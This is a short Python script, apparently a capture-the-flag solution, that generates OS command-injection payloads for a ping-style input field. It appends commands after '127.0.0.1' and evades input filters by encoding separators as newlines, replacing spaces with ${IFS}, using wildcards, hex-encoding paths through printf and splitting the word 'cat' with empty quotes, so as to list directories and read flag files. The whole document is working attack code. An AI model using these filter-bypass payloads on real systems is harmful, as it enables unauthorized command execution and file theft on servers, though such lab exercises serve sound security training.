import string
filters = '")' 

def to_sh_hex(txt):
	return ''.join('\\x{:02x}'.format(ord(x)) if x not in filters else x for x in txt)
def conv(t):
	t = t.replace(';', '%0a')
	t = t.replace(' ', '${IFS}')
	t = t.replace('lag', '*')
	print(t)
conv('127.0.0.1;ls')
conv('127.0.0.1;cd flag_is_here;ls')
conv('127.0.0.1;cd flag_is_here;more flag_12646135912113.php')

hexstr = to_sh_hex("flag_is_here")
conv(f'127.0.0.1;ls $(printf "{hexstr}")') # ls $(printf 'flag_is_here')
hexstr = to_sh_hex("flag_is_here/flag_9494642624124.php")
conv(f'127.0.0.1;ca\'\'t $(printf "{hexstr}")') # cat $(printf 'flag_is_here/flag_9494642624124.php')
